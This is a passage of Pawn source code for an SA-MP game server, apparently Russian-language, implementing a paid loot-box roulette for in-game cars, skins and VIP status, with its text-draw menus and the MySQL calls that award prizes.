#define ROULETTE_PRICE_CARS     499 // Стоимость рулетки авто
#define ROULETTE_PRICE_SKINS    199 // Стоимость рулетки скинов
#define ROULETTE_PRICE_VIPS     149 // Стоимость рулетки випок
#define ROULETTE_RARE_VISIBLE   10	// Процент показа редких предметов в рулетке (не влияет на шанс выпадения)
#define ROULETTE_RARE_COUNT     50 // Какая рулетка по счету выдаст редкий предмет
#define ROULETTE_ROLL_SPEED     500 // Скорость вращения рулетки

new Roulette_count = 0;             // Счетчик рулеток на сервере


enum RouletteAdvert
{
	R_AD_text[32],
	R_AD_icon[26]
};
enum RouletteItems
{
	R_Item_name[32],
	R_Icon[26],
	R_Model,
};
enum RouletteItemsVIP
{
	R_Item_name[32],
	R_Icon[26],
	R_Model,
	R_Temp
};
enum RouletteVisible
{
	R_Item_ID[9],
	bool: R_Rare[9]
}

new PlayerText:RoulettePTD_Main[MAX_PLAYERS][7];
new PlayerText:RoulettePTD_AD_Ico[MAX_PLAYERS][15];
new PlayerText:RoulettePTD_AD_Text[MAX_PLAYERS][15];
new PlayerText:RoulettePTD_AD_Price[MAX_PLAYERS];
new PlayerText:RoulettePTD_Roll[MAX_PLAYERS][6];
new PlayerText:RoulettePTD_Roll_Icon[MAX_PLAYERS][9];
new PlayerText:RoulettePTD_Roll_Text[MAX_PLAYERS][9];
new PlayerText:RoulettePTD_Prize[MAX_PLAYERS][4];

new RouletteVisibleIDs[MAX_PLAYERS][RouletteVisible];
new RouletteMenuSelectable[MAX_PLAYERS]; // -1
new RoulettePlayerTicks[MAX_PLAYERS]; // -1


/*
Список иконок для рулетки:

perfect:icon_rare_car
perfect:icon_rare_skin
perfect:icon_car
perfect:icon_skin
perfect:icon_vip_ruby
perfect:icon_vip_sapphire
perfect:icon_vip_emerald
*/

// Название         Иконка
new const Roulette_Advertise_Cars[15][RouletteAdvert] = { // Реклама
{"Tesla~n~Model S", "perfect:icon_car"},
{"Car~n~1", "perfect:icon_car"},
{"Bugatti~n~Chiron", "perfect:icon_car"},
{"Tesla~n~CyberTruck", "perfect:icon_rare_car"},
{"Mercedes~n~G65 6x6", "perfect:icon_car"},
{"Car~n~2", "perfect:icon_car"},
{"Maybach~n~X222", "perfect:icon_car"},
{"Lexus~n~LX570", "perfect:icon_car"},
{"Toyota Land~n~Cruiser 200", "perfect:icon_car"},
{"Lamborghini~n~Urus", "perfect:icon_car"},
{"Mercedes Benz~n~S600", "perfect:icon_car"},
{"Rolls-Royce~n~Wraith", "perfect:icon_car"},
{"Mercedes~n~CLS63 AMGs", "perfect:icon_car"},
{"Lamborghini~n~Huracan", "perfect:icon_car"},
{"[T] Subaru~n~BRZ", "perfect:icon_rare_car"}
};

// Название         Иконка
new const Roulette_Advertise_Skins[15][RouletteAdvert] = { // Реклама
{"Top 1", "perfect:icon_rare_skin"},
{"Low 1", "perfect:icon_skin"},
{"Top 2", "perfect:icon_rare_skin"},
{"Low 2", "perfect:icon_skin"},
{"Top 3", "perfect:icon_rare_skin"},
{"Low 3", "perfect:icon_skin"},
{"Top 4", "perfect:icon_rare_skin"},
{"Low 4", "perfect:icon_skin"},
{"Top 5", "perfect:icon_rare_skin"},
{"Low 5", "perfect:icon_skin"},
{"Top 6", "perfect:icon_rare_skin"},
{"Low 6", "perfect:icon_skin"},
{"Top 7", "perfect:icon_rare_skin"},
{"Low 7", "perfect:icon_skin"},
{"Top 8", "perfect:icon_rare_skin"}
};

// Название         Иконка
new const Roulette_Advertise_Vips[15][RouletteAdvert] = { // Реклама
{"Ruby~n~3 days", "perfect:icon_vip_ruby"},
{"Ruby~n~6 days", "perfect:icon_vip_ruby"},
{"Ruby~n~9 days", "perfect:icon_vip_ruby"},
{"Ruby~n~12 days", "perfect:icon_vip_ruby"},
{"Ruby~n~14 days", "perfect:icon_vip_ruby"},
{"Emerald~n~3 days", "perfect:icon_vip_emerald"},
{"Emerald~n~6 days", "perfect:icon_vip_emerald"},
{"Emerald~n~9 days", "perfect:icon_vip_emerald"},
{"Emerald~n~12 days", "perfect:icon_vip_emerald"},
{"Emerald~n~14 days", "perfect:icon_vip_emerald"},
{"Sapphire~n~3 days", "perfect:icon_vip_sapphire"},
{"Sapphire~n~6 days", "perfect:icon_vip_sapphire"},
{"Sapphire~n~9 days", "perfect:icon_vip_sapphire"},
{"Sapphire~n~12 days", "perfect:icon_vip_sapphire"},
{"Sapphire~n~14 days", "perfect:icon_vip_sapphire"}
};

// Название         Иконка         ID model
new Roulette_Items_Cars[][RouletteItems] = {
{"Tesla~n~Model S", "perfect:icon_car", 402},
{"Car~n~1", "perfect:icon_car", 543},
{"Bugatti~n~Chiron", "perfect:icon_car", 494},
{"Mercedes~n~G65 6x6", "perfect:icon_car", 495},
{"Car~n~2", "perfect:icon_car", 504},
{"Maybach~n~X222", "perfect:icon_car", 551},
{"Car~n~3", "perfect:icon_car", 470},
{"Lexus~n~LX570", "perfect:icon_car", 579},
{"Toyota Land~n~Cruiser 200", "perfect:icon_car", 409},
{"Car~n~4", "perfect:icon_car", 415},
{"Lamborghini~n~Urus", "perfect:icon_car", 475},
{"Mercedes Benz~n~S600", "perfect:icon_car", 421},
{"Car~n~5", "perfect:icon_car", 481},
{"Car~n~6", "perfect:icon_car", 535},
{"Car~n~7", "perfect:icon_car", 568},
{"Rolls-Royce~n~Wraith", "perfect:icon_car", 580},
{"Mercedes~n~CLS63 AMGs", "perfect:icon_car", 587},
{"Lamborghini~n~Huracan", "perfect:icon_car", 602},
{"Car~n~8", "perfect:icon_car", 605},
{"Car~n~9", "perfect:icon_car", 550}
};
new Roulette_Items_Cars_Rare[][RouletteItems] = {
{"Tesla~n~CyberTruck", "perfect:icon_rare_car", 542},
{"[T] Subaru~n~BRZ", "perfect:icon_rare_car", 560}
};

// Название   Иконка       ID skin
new Roulette_Items_Skins[][RouletteItems] = {
{"Low 1", "perfect:icon_skin", 294},
{"Low 2", "perfect:icon_skin", 295},
{"Low 3", "perfect:icon_skin", 186},
{"Low 4", "perfect:icon_skin", 188},
{"Low 5", "perfect:icon_skin", 274},
{"Low 6", "perfect:icon_skin", 272},
{"Low 7", "perfect:icon_skin", 199}
};

new Roulette_Items_Skins_Rare[][RouletteItems] = {
{"Top 1", "perfect:icon_rare_skin", 276},
{"Top 2", "perfect:icon_rare_skin", 279},
{"Top 3", "perfect:icon_rare_skin", 282},
{"Top 4", "perfect:icon_rare_skin", 286},
{"Top 5", "perfect:icon_rare_skin", 289},
{"Top 6", "perfect:icon_rare_skin", 290},
{"Top 7", "perfect:icon_rare_skin", 293},
{"Top 8", "perfect:icon_rare_skin", 296}
};


// Название   Иконка  					  Тип Дни
new Roulette_Items_Vips[][RouletteItemsVIP] = {
{"Ruby~n~3 days", "perfect:icon_vip_ruby", 0, 3},
{"Ruby~n~6 days", "perfect:icon_vip_ruby", 0, 6},
{"Ruby~n~9 days", "perfect:icon_vip_ruby", 0, 9},
{"Ruby~n~12 days", "perfect:icon_vip_ruby", 0, 12},
{"Ruby~n~14 days", "perfect:icon_vip_ruby", 0, 14},
{"Emerald~n~3 days", "perfect:icon_vip_emerald", 2, 3},
{"Emerald~n~6 days", "perfect:icon_vip_emerald", 2, 6},
{"Emerald~n~9 days", "perfect:icon_vip_emerald", 2, 9},
{"Emerald~n~12 days", "perfect:icon_vip_emerald", 2, 12},
{"Emerald~n~14 days", "perfect:icon_vip_emerald", 2, 14}
};
new Roulette_Items_Vips_Rare[][RouletteItemsVIP] = {
{"Sapphire~n~3 days", "perfect:icon_vip_sapphire", 1, 3},
{"Sapphire~n~6 days", "perfect:icon_vip_sapphire", 1, 6},
{"Sapphire~n~9 days", "perfect:icon_vip_sapphire", 1, 9},
{"Sapphire~n~12 days", "perfect:icon_vip_sapphire", 1, 12},
{"Sapphire~n~14 days", "perfect:icon_vip_sapphire", 1, 14}
};

stock RouletteClickTextDraw(playerid, PlayerText:playertextid)
{
    if(playertextid == RoulettePTD_Main[playerid][1])
    {
		CancelSelectTextDrawEx(playerid);
		DestroyRoulettePTD_AD(playerid);
		DestroyRoulettePTD_Main(playerid);
		RouletteMenuSelectable[playerid] = -1;
		RoulettePlayerTicks[playerid] = -1;
		PlayerPlaySound(playerid, 1055, 0.0, 0.0, 0.0);
		if(PI[playerid][pSettingTD][0] == 1) CPTD_Euro(playerid);
		return 1;
	}

	if(playertextid == RoulettePTD_Main[playerid][2]) return PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0), SelectRouletteMenu(playerid,0);
	if(playertextid == RoulettePTD_Main[playerid][3]) return PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0), SelectRouletteMenu(playerid,1);
	if(playertextid == RoulettePTD_Main[playerid][4]) return PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0), SelectRouletteMenu(playerid,2);
	if(playertextid == RoulettePTD_Main[playerid][5]) return PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0), SelectRouletteMenu(playerid,3);
	if(playertextid == RoulettePTD_Main[playerid][6])
	{
		DestroyRoulettePTD_AD(playerid);
		DestroyRoulettePTD_Main(playerid);
		CreateRoulettePTD_Roll(playerid);
		ShowRoulettePTD_Roll(playerid,RouletteMenuSelectable[playerid]);
		PlayerPlaySound(playerid, 1055, 0.0, 0.0, 0.0);
		return 1;
	}
	if(playertextid == RoulettePTD_Roll[playerid][1])
	{
        if(RoulettePlayerTicks[playerid] != -1) return 1;
		PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
		UpdateRoulettePTD_Roll(playerid,RouletteMenuSelectable[playerid]-1);
		return 1;
	}
	if(playertextid == RoulettePTD_Roll[playerid][2]) // Вернуться на выбор рулетки!
	{
        if(RoulettePlayerTicks[playerid] != -1) return 1;
		DestroyRoulettePTD_Roll(playerid);
		RoulettePlayerTicks[playerid] = -1;
        CreateRoulettePTD_Main(playerid);
        ShowRoulettePTD_Main(playerid);
        RouletteMenuSelectable[playerid] = 0;
        RoulettePlayerTicks[playerid] = -1;
        PlayerPlaySound(playerid, 1055, 0.0, 0.0, 0.0);
		return 1;
	}
	if(playertextid == RoulettePTD_Roll[playerid][3]) // Закрыть
	{
	    if(RoulettePlayerTicks[playerid] != -1) return 1;
	    CancelSelectTextDrawEx(playerid);
		DestroyRoulettePTD_Roll(playerid);
		RouletteMenuSelectable[playerid] = -1;
		RoulettePlayerTicks[playerid] = -1;
		PlayerPlaySound(playerid, 1055, 0.0, 0.0, 0.0);
		if(PI[playerid][pSettingTD][0] == 1) CPTD_Euro(playerid);
		return 1;
	}
	if(playertextid == RoulettePTD_Roll[playerid][4]) // Запуск рулетки
	{
		if(RoulettePlayerTicks[playerid] != -1) return 1;
		switch(RouletteMenuSelectable[playerid])
		{
			case 1: format(String64,sizeof(String64),"Вы хотите запустить авто-рулетку за %d "SERVER_COINS"?", ROULETTE_PRICE_CARS);
			case 2:
			{
                if(CheckMaxVes(playerid,107,100)==1) return SendClientMessage(playerid,COLOR_GREY,"У вас нет свободного места в инвентаре!");
				format(String64,sizeof(String64),"Вы хотите запустить рулетку скинов за %d "SERVER_COINS"?", ROULETTE_PRICE_SKINS);
			}
			case 3: format(String64,sizeof(String64),"Вы хотите запустить VIP рулетку за %d "SERVER_COINS"?", ROULETTE_PRICE_VIPS);
		}
		SPD(playerid, 2411, DIALOG_STYLE_MSGBOX, "Подтверждение", String64, "Да", "Нет");
		return 1;
	}
	if(playertextid == RoulettePTD_Prize[playerid][1])
	{
        PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
	    CancelSelectTextDrawEx(playerid);
		DestroyPTD_Prize(playerid);
		switch(RouletteMenuSelectable[playerid])
		{
			case 1: // auto
			{
			    new car_model;
				if(RouletteVisibleIDs[playerid][R_Rare][4] == true) car_model = Roulette_Items_Cars_Rare[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Model];
				else car_model = Roulette_Items_Cars[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Model];

				STRING_GLOBAL[0] = EOS;
				mysql_format(db_prod, STRING_GLOBAL, sizeof(STRING_GLOBAL), "INSERT INTO `ownable_cars` (`c_model`, `c_x`, `c_y`, `c_z`, `c_a`, `c_class`, `c_owner`, `c_fuel`, `c_color1`, `c_color2`, `c_lock`, `c_price`, `c_health`) VALUES ('%d', '0', '0', '0', '0', '1', '%e', '45', '-1', '-1', '1', '9000000', '1000.0')", car_model, GetName(playerid));
				mysql_tquery(db_prod, STRING_GLOBAL, "", "");

				PI[playerid][pCountCars] ++;

				format(stringer1, sizeof(stringer1), "UPDATE `accounts` SET countcars=%d WHERE id=%d", PI[playerid][pCountCars], PI[playerid][pID]);
				mysql_tquery(db_prod, stringer1, "", "");

				format(String144,sizeof(String144),"Поздравляем, вы получили %s", VehicleNames[car_model-400]);
				SendClientMessage(playerid, 0xFFFF00FF, String144);
				SendClientMessage(playerid, 0xFFFF00FF, "Для загрузки автомобиля в игру, используйте команду /fixcar");
			}
			case 2: // skins
			{
			    new skin_id;
				if(RouletteVisibleIDs[playerid][R_Rare][4] == true) skin_id = Roulette_Items_Skins_Rare[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Model];
				else skin_id = Roulette_Items_Skins[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Model];

				new newslot;
				if(CheckMaxVes(playerid,107,skin_id,newslot)==1) SendClientMessage(playerid,COLOR_GREY,"У вас нет свободного места в инвентаре! Предмет был удален!");
				else
				{
					PlayerItem1[playerid][newslot] = 107;
					PlayerItem2[playerid][newslot] = skin_id;
					
					SaveItem(playerid, newslot);
				}
				SendClientMessage(playerid, 0xFFFF00FF, "Поздравляем, одежда была добавлена в ваш инвентарь");
			}
			case 3: // vips
			{
			    new vip_id; 
			    new days;
				if(RouletteVisibleIDs[playerid][R_Rare][4] == true) vip_id = Roulette_Items_Vips_Rare[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Model], days = Roulette_Items_Vips_Rare[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Temp];
				else vip_id = Roulette_Items_Vips[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Model], days = Roulette_Items_Vips[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Temp];
				new str[9];
				switch(vip_id)
				{
					case VIP_STATE_RUBY: str = "Ruby";
					case VIP_STATE_SAPPHIRE: str = "Sapphire";
					case VIP_STATE_EMERALD: str = "Emerald";
				}
				if(PI[playerid][pVip] == vip_id)
				{
                    PI[playerid][pVipTime] += days;
                    
					format(String144,sizeof(String144),"Поздравляем, ваш действующий VIP %s был продлен на %d дней", str, days);
					SendClientMessage(playerid, 0xFFFF00FF, String144);
				}
				else
				{
                    PI[playerid][pVipTime] = days;
                    PI[playerid][pVip] = vip_id;

					format(String144,sizeof(String144),"Поздравляем c получением VIP %s на %d дней", str, days);
					SendClientMessage(playerid, 0xFFFF00FF, String144);
				}
				
				SaveAccount(playerid);
			}
		}
		RoulettePlayerTicks[playerid] = -1; // Выставить после выдачи приза!
		RouletteMenuSelectable[playerid] = -1;
		if(PI[playerid][pSettingTD][0] == 1) CPTD_Euro(playerid);
		return 1;
	}
	return 1;
}

stock SelectRouletteMenu(playerid,menu)
{
	if(RouletteMenuSelectable[playerid] == -1 || RouletteMenuSelectable[playerid] == menu) return 1;
	switch(menu)
	{
		case 0:
		{
			DestroyRoulettePTD_AD(playerid);// main menu info
            PlayerTextDrawHide(playerid,RoulettePTD_Main[playerid][6]);

			PlayerTextDrawSetString(playerid,RoulettePTD_Main[playerid][0],"perfect:roulette_background_text");
			PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][0]);

			PlayerTextDrawSetString(playerid,RoulettePTD_Main[playerid][2],"perfect:roulette_info_on");
			PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][2]);
		}
		case 1: // car roulette info
		{
			if(RouletteMenuSelectable[playerid] == 0) CreateRoulettePTD_AD(playerid);
			UpdateRoulettePTD_AD(playerid, 0);
			PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][6]);

			if(RouletteMenuSelectable[playerid] == 0)
			{
				PlayerTextDrawSetString(playerid,RoulettePTD_Main[playerid][0],"perfect:roulette_background");
				PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][0]);
			}
			PlayerTextDrawSetString(playerid,RoulettePTD_Main[playerid][3],"perfect:roulette_auto_on");
			PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][3]);
		}
		case 2: // skin roulette info
		{
			if(RouletteMenuSelectable[playerid] == 0) CreateRoulettePTD_AD(playerid);
			UpdateRoulettePTD_AD(playerid, 1);
			PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][6]);

			if(RouletteMenuSelectable[playerid] == 0)
			{
				PlayerTextDrawSetString(playerid,RoulettePTD_Main[playerid][0],"perfect:roulette_background");
				PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][0]);
			}
			PlayerTextDrawSetString(playerid,RoulettePTD_Main[playerid][4],"perfect:roulette_skins_on");
			PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][4]);
		}
		case 3: // vip roulette info
		{
			if(RouletteMenuSelectable[playerid] == 0) CreateRoulettePTD_AD(playerid);
			UpdateRoulettePTD_AD(playerid, 2);
			PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][6]);

			if(RouletteMenuSelectable[playerid] == 0)
			{
				PlayerTextDrawSetString(playerid,RoulettePTD_Main[playerid][0],"perfect:roulette_background");
				PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][0]);
			}
			PlayerTextDrawSetString(playerid,RoulettePTD_Main[playerid][5],"perfect:roulette_vip_on");
			PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][5]);
		}
	}
	switch(RouletteMenuSelectable[playerid])
	{
		case 0:
		{
			PlayerTextDrawSetString(playerid,RoulettePTD_Main[playerid][2],"perfect:roulette_info");
			PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][2]);
		}
		case 1:
		{
			PlayerTextDrawSetString(playerid,RoulettePTD_Main[playerid][3],"perfect:roulette_auto");
			PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][3]);
		}
		case 2:
		{
			PlayerTextDrawSetString(playerid,RoulettePTD_Main[playerid][4],"perfect:roulette_skins");
			PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][4]);
		}
		case 3:
		{
			PlayerTextDrawSetString(playerid,RoulettePTD_Main[playerid][5],"perfect:roulette_vip");
			PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][5]);
		}
	}
	RouletteMenuSelectable[playerid] = menu;
	return 1;
}

stock ShowRoulettePTD_Main(playerid)
{
   	for(new i = 0; i < 6; i ++) PlayerTextDrawShow(playerid,RoulettePTD_Main[playerid][i]);
	return 1;
}

stock DestroyRoulettePTD_Main(playerid)
{
	for(new i = 0; i < 7; i ++)
	{
		PlayerTextDrawHide(playerid,RoulettePTD_Main[playerid][i]);
		PlayerTextDrawDestroy(playerid,RoulettePTD_Main[playerid][i]);
		RoulettePTD_Main[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
	}
	return 1;
}

stock UpdateRoulettePTD_AD(playerid, type)
{
	switch(type)
	{
		case 0: // auto
		{
			for(new i = 0; i < 15; i ++)
			{
       			PlayerTextDrawSetString(playerid,RoulettePTD_AD_Ico[playerid][i],Roulette_Advertise_Cars[i][R_AD_icon]);
        		PlayerTextDrawSetString(playerid,RoulettePTD_AD_Text[playerid][i],Roulette_Advertise_Cars[i][R_AD_text]);
				PlayerTextDrawShow(playerid,RoulettePTD_AD_Ico[playerid][i]);
				PlayerTextDrawShow(playerid,RoulettePTD_AD_Text[playerid][i]);
			}
			format(String64,sizeof(String64),"C¦oњЇoc¦©_pyћe¦kњ:_%d_py—ћeќ",ROULETTE_PRICE_CARS);
			PlayerTextDrawSetString(playerid,RoulettePTD_AD_Price[playerid],String64);
			PlayerTextDrawShow(playerid,RoulettePTD_AD_Price[playerid]);
			return 1;
		}
		case 1: // skins
		{
			for(new i = 0; i < 15; i ++)
			{
       			PlayerTextDrawSetString(playerid,RoulettePTD_AD_Ico[playerid][i],Roulette_Advertise_Skins[i][R_AD_icon]);
        		PlayerTextDrawSetString(playerid,RoulettePTD_AD_Text[playerid][i],Roulette_Advertise_Skins[i][R_AD_text]);
				PlayerTextDrawShow(playerid,RoulettePTD_AD_Ico[playerid][i]);
				PlayerTextDrawShow(playerid,RoulettePTD_AD_Text[playerid][i]);
			}
			format(String64,sizeof(String64),"C¦oњЇoc¦©_pyћe¦kњ:_%d_py—ћeќ",ROULETTE_PRICE_SKINS);
			PlayerTextDrawSetString(playerid,RoulettePTD_AD_Price[playerid],String64);
			PlayerTextDrawShow(playerid,RoulettePTD_AD_Price[playerid]);
			return 1;
		}
		case 2: // vips
		{
			for(new i = 0; i < 15; i ++)
			{
       			PlayerTextDrawSetString(playerid,RoulettePTD_AD_Ico[playerid][i],Roulette_Advertise_Vips[i][R_AD_icon]);
        		PlayerTextDrawSetString(playerid,RoulettePTD_AD_Text[playerid][i],Roulette_Advertise_Vips[i][R_AD_text]);
				PlayerTextDrawShow(playerid,RoulettePTD_AD_Ico[playerid][i]);
				PlayerTextDrawShow(playerid,RoulettePTD_AD_Text[playerid][i]);
			}
			format(String64,sizeof(String64),"C¦oњЇoc¦©_pyћe¦kњ:_%d_py—ћeќ",ROULETTE_PRICE_VIPS);
			PlayerTextDrawSetString(playerid,RoulettePTD_AD_Price[playerid],String64);
			PlayerTextDrawShow(playerid,RoulettePTD_AD_Price[playerid]);
			return 1;
		}
	}
	return 1;
}

stock DestroyRoulettePTD_AD(playerid)
{
	for(new i = 0; i < 15; i ++)
	{
 		PlayerTextDrawHide(playerid,RoulettePTD_AD_Ico[playerid][i]);
   		PlayerTextDrawHide(playerid,RoulettePTD_AD_Text[playerid][i]);
		PlayerTextDrawDestroy(playerid,RoulettePTD_AD_Ico[playerid][i]);
		PlayerTextDrawDestroy(playerid,RoulettePTD_AD_Text[playerid][i]);
		RoulettePTD_AD_Ico[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
		RoulettePTD_AD_Text[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
	}
	PlayerTextDrawHide(playerid,RoulettePTD_AD_Price[playerid]);
	PlayerTextDrawDestroy(playerid,RoulettePTD_AD_Price[playerid]);
	RoulettePTD_AD_Price[playerid] = PlayerText:INVALID_TEXT_DRAW;
	return 1;
}

stock DestroyRoulettePTD_Roll(playerid)
{
	for(new i = 0; i < 9; i ++)
	{
 		PlayerTextDrawHide(playerid,RoulettePTD_Roll_Icon[playerid][i]);
 		PlayerTextDrawHide(playerid,RoulettePTD_Roll_Text[playerid][i]);

		PlayerTextDrawDestroy(playerid,RoulettePTD_Roll_Icon[playerid][i]);
 		PlayerTextDrawDestroy(playerid,RoulettePTD_Roll_Text[playerid][i]);

		RoulettePTD_Roll_Icon[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
		RoulettePTD_Roll_Text[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
	}
	for(new i = 0; i < 6; i ++)
	{
 		PlayerTextDrawHide(playerid,RoulettePTD_Roll[playerid][i]);
 		PlayerTextDrawDestroy(playerid,RoulettePTD_Roll[playerid][i]);
		RoulettePTD_Roll[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
	}
	return 1;
}

///////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////
stock UpdateRoulettePTD_Roll(playerid,type)
{
	switch(type)
	{
		case 0: // auto
		{
			for(new i = 0; i < 9; i ++)
			{
				new rand = random(100)+1;
    			if(rand > ROULETTE_RARE_VISIBLE)
				{
					rand = random(sizeof(Roulette_Items_Cars));
       				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][i],Roulette_Items_Cars[rand][R_Icon]);
        			PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][i],Roulette_Items_Cars[rand][R_Item_name]);
        			RouletteVisibleIDs[playerid][R_Item_ID][i] = rand;
        			RouletteVisibleIDs[playerid][R_Rare][i] = false;
				}
				else
				{
					rand = random(sizeof(Roulette_Items_Cars_Rare));
       				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][i],Roulette_Items_Cars_Rare[rand][R_Icon]);
        			PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][i],Roulette_Items_Cars_Rare[rand][R_Item_name]);
        			RouletteVisibleIDs[playerid][R_Item_ID][i] = rand;
        			RouletteVisibleIDs[playerid][R_Rare][i] = true;
				}
				PlayerTextDrawShow(playerid,RoulettePTD_Roll_Icon[playerid][i]);
				PlayerTextDrawShow(playerid,RoulettePTD_Roll_Text[playerid][i]);
			}
			return 1;
		}
		case 1: // skins
		{
			for(new i = 0; i < 9; i ++)
			{
				new rand = random(100)+1;
    			if(rand > ROULETTE_RARE_VISIBLE)
				{
					rand = random(sizeof(Roulette_Items_Skins));
       				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][i],Roulette_Items_Skins[rand][R_Icon]);
        			PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][i],Roulette_Items_Skins[rand][R_Item_name]);
        			RouletteVisibleIDs[playerid][R_Item_ID][i] = rand;
        			RouletteVisibleIDs[playerid][R_Rare][i] = false;
				}
				else
				{
					rand = random(sizeof(Roulette_Items_Skins_Rare));
       				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][i],Roulette_Items_Skins_Rare[rand][R_Icon]);
        			PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][i],Roulette_Items_Skins_Rare[rand][R_Item_name]);
        			RouletteVisibleIDs[playerid][R_Item_ID][i] = rand;
        			RouletteVisibleIDs[playerid][R_Rare][i] = true;
				}
				PlayerTextDrawShow(playerid,RoulettePTD_Roll_Icon[playerid][i]);
				PlayerTextDrawShow(playerid,RoulettePTD_Roll_Text[playerid][i]);
			}
			return 1;
		}
		case 2: // vips
		{
			for(new i = 0; i < 9; i ++)
			{
				new rand = random(100)+1;
    			if(rand > ROULETTE_RARE_VISIBLE)
				{
					rand = random(sizeof(Roulette_Items_Vips));
       				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][i],Roulette_Items_Vips[rand][R_Icon]);
        			PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][i],Roulette_Items_Vips[rand][R_Item_name]);
        			RouletteVisibleIDs[playerid][R_Item_ID][i] = rand;
        			RouletteVisibleIDs[playerid][R_Rare][i] = false;
				}
				else
				{
					rand = random(sizeof(Roulette_Items_Vips_Rare));
       				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][i],Roulette_Items_Vips_Rare[rand][R_Icon]);
        			PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][i],Roulette_Items_Vips_Rare[rand][R_Item_name]);
        			RouletteVisibleIDs[playerid][R_Item_ID][i] = rand;
        			RouletteVisibleIDs[playerid][R_Rare][i] = true;
				}
				PlayerTextDrawShow(playerid,RoulettePTD_Roll_Icon[playerid][i]);
				PlayerTextDrawShow(playerid,RoulettePTD_Roll_Text[playerid][i]);
			}
			return 1;
		}
	}
	return 1;
}

stock ShowRoulettePTD_Roll(playerid,rollid)
{
	switch(rollid)
	{
		case 1:
		{
			for(new i = 0; i < 5; i ++) PlayerTextDrawShow(playerid,RoulettePTD_Roll[playerid][i]);
			PlayerTextDrawSetString(playerid,RoulettePTD_Roll[playerid][5],"Aў¦o-pyћe¦ka");
			PlayerTextDrawShow(playerid,RoulettePTD_Roll[playerid][5]);
			UpdateRoulettePTD_Roll(playerid,0);
			return 1;
		}
		case 2:
		{
			for(new i = 0; i < 5; i ++) PlayerTextDrawShow(playerid,RoulettePTD_Roll[playerid][i]);
			PlayerTextDrawSetString(playerid,RoulettePTD_Roll[playerid][5],"Pyћe¦ka ckњ®oў");
			PlayerTextDrawShow(playerid,RoulettePTD_Roll[playerid][5]);
			UpdateRoulettePTD_Roll(playerid,1);
			return 1;
		}
		case 3:
		{
			for(new i = 0; i < 5; i ++) PlayerTextDrawShow(playerid,RoulettePTD_Roll[playerid][i]);
			PlayerTextDrawSetString(playerid,RoulettePTD_Roll[playerid][5],"VIP_pyћe¦ka");
			PlayerTextDrawShow(playerid,RoulettePTD_Roll[playerid][5]);
			UpdateRoulettePTD_Roll(playerid,2);
			return 1;
		}
	}
	return 1;
}



stock GoRollNextStep(playerid, type)
{
	switch(type)
	{
		case 1: // auto
		{
			for(new i = 0; i < 8; i ++)
			{
				RouletteVisibleIDs[playerid][R_Item_ID][i] = RouletteVisibleIDs[playerid][R_Item_ID][i+1];
				RouletteVisibleIDs[playerid][R_Rare][i] = RouletteVisibleIDs[playerid][R_Rare][i+1];
				if(RouletteVisibleIDs[playerid][R_Rare][i] == true)
				{
       				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][i],Roulette_Items_Cars_Rare[RouletteVisibleIDs[playerid][R_Item_ID][i]][R_Icon]);
        			PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][i],Roulette_Items_Cars_Rare[RouletteVisibleIDs[playerid][R_Item_ID][i]][R_Item_name]);
				}
				else
				{
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][i],Roulette_Items_Cars[RouletteVisibleIDs[playerid][R_Item_ID][i]][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][i],Roulette_Items_Cars[RouletteVisibleIDs[playerid][R_Item_ID][i]][R_Item_name]);
				}
				PlayerTextDrawShow(playerid,RoulettePTD_Roll_Icon[playerid][i]);
				PlayerTextDrawShow(playerid,RoulettePTD_Roll_Text[playerid][i]);
			}
